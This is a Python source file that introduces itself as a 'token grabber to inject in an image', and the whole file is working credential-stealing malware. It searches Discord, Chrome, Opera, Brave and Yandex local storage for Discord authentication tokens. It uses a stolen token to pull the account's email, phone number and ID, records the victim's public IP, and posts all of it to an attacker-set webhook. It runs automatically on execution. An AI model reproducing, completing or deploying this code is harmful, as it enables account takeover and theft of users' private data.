#######
#
#	Token grabber to inject in an image
#

import os
import re
import json
import platform
import requests

WEBHOOK_URL = "url here"
WEBHOOK_AVATAR = "your avatar"
WEBHOOK_USERNAME = "tkgrab"

TOKENGRAB_REGEX = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'

class TKGrab():

	def __init__(self): pass


	def fetch_token(self, where):

		try:

			token_array = []

			for file in os.listdir(where + "/Local Storage/leveldb"):

				if file.endswith('.log') or file.endswith('.ldb') or file.endswith('.sqlite'):
					
					for line in [x.strip() for x in open('{}/{}'.format(where + "/Local Storage/leveldb", file), errors="ignore").readlines() if x.strip()]:
						
						for regex_fetch in TOKENGRAB_REGEX:
							for token in re.findall(regex_fetch, line):
								token_array.append(token)

				else: continue

			return token_array
   
		except Exception as E: raise E


	def get_user_data(self, token):

		try:

			return json.loads(requests.get("https://discordapp.com/api/v6/users/@me", headers={"Authorization": token}).text)

		except Exception as E : raise E


	def send_webhook(self, data):

		try:

			message_embed = {
			  	"content": '',
			  	'username': WEBHOOK_USERNAME,
				'avatar_url': WEBHOOK_AVATAR,
			  	"embeds": [{
			      "title": "New token grabbed :innocent:",
			      "description": data,
			      "color": 65484
			    }],
			  	"attachments": []
			}

			if requests.post(WEBHOOK_URL, json=message_embed).status_code == 200:

				return True

			else: return False

		except Exception as E : raise E


def main():

	process = TKGrab()
	content = "IP : {}\nPlatform : {}\n".format(json.loads(requests.get("http://jsonip.com").text)['ip'], platform.platform())

	try:

		if os.name == "nt":

			env_local = os.getenv('LOCALAPPDATA')
			env_roaming = os.getenv('APPDATA')

			paths = {
				'Discord': 				env_roaming + '\\Discord',
				'Discord Canary': 		env_roaming + '\\discordcanary',
				'Discord PTB': 			env_roaming + '\\discordptb',
				'Google Chrome': 		env_local + '\\Google\\Chrome\\User Data\\Default',
				'Opera': 				env_roaming + '\\Opera Software\\Opera Stable',
				'Brave': 				env_local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
				'Yandex': 				env_local + '\\Yandex\\YandexBrowser\\User Data\\Default'
			}

		else: paths = { "Discord": "{}/.config/discord".format(os.getenv('HOME')) }

		content += "\nToken(s) found : ```"

		for location, path in paths.items():

			if os.path.exists(path):

				found_tokens = process.fetch_token(path)

				if len(found_tokens) > 0:

					for token in found_tokens: content += "\n{}\n".format(token)
		
					user_data = process.get_user_data(found_tokens[0])

					content += "```\nAccount informations : ```\n\tID : {}\n\tTag : {}\n\tEmail address : {}\n\tPhone number : {}\n\tPremium type : {}\n```".format(user_data['id'], 
						user_data['username'] + '#' + user_data['discriminator'],
						user_data['email'],
						user_data['phone'],
						user_data['premium_type'])

				else: content += "No token found\n"

				process.send_webhook(content)

			else: continue

	except Exception as E: process.send_webhook(content + "**An error occured** : " + str(E))

main()